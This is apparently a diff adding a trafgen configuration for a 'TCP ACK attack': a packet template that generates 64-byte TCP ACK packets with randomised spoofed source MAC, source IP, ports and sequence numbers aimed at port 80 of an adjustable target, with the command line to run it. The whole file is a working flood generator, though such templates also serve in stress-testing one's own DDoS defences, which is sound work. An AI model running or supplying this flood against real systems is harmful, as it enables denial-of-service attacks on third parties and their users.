@@ -1,0 +1,65 @@
+/* TCP ACK attack ( 64byte )
+ * Command example:
+ *  trafgen --cpp --dev em2 --conf ackflood.trafgen --verbose
+ * Note: dynamic elements "drnd()" make trafgen slower
+ */
+
+#define ETH_P_IP	0x0800
+
+#define SYN		(1 << 1)
+#define ACK		(1 << 4)
+#define ECN		(1 << 6)
+
+{
+  /* --- Ethernet Header --- */
+  /* NEED ADJUST */
+  0x00, 0x12, 0xc0, 0x02, 0xac, 0x56,  # MAC Destination
+  0x00, 0x12, 0xc0, drnd(3),  # MAC Source
+  
+  const16(ETH_P_IP),
+  /* IPv4 Version, IHL, TOS */
+  0b01000101, 0,
+  /* IPv4 Total Len */
+  const16(46),
+  /* IPv4 Ident */
+  drnd(2),
+  //const16(2),
+
+  /* IPv4 Flags, Frag Off */
+  0b01000000, 0,
+  /* IPv4 TTL */
+  64,
+  /* Proto TCP */
+  0x06,
+  /* IPv4 Checksum (IP header from, to) */
+  csumip(14, 33),
+
+  /* NEED ADJUST */
+  10, 10, 88, drnd(1), # Source IP
+  10, 10, 88, 172, # Dest IP
+
+  /* TCP Source Port */
+  drnd(2),
+  /* TCP Dest Port */
+  const16(80),
+  /* TCP Sequence Number */
+  drnd(4),
+  /* TCP Ackn. Number */
+  drnd(4),
+
+  /* TCP Header length + Flags */
+  //const16((0x5 << 12) | SYN | ECN)	/* TCP SYN+ECN Flag */
+  //const16((0x5 << 12) | SYN | ACK)	/* TCP SYN+ACK Flag */
+  //const16((0x5 << 12) | SYN)		/* TCP SYN Flag */
+  const16((0x5 << 12) | ACK)		/* TCP ACK Flag */
+
+  /* Window Size */
+  const16(16),
+  /* TCP Checksum (offset IP, offset TCP) */
+  csumtcp(14, 34),
+  const16(0), /*PAD*/
+  
+  /* Data */
+  "ACKswf"
+}
+
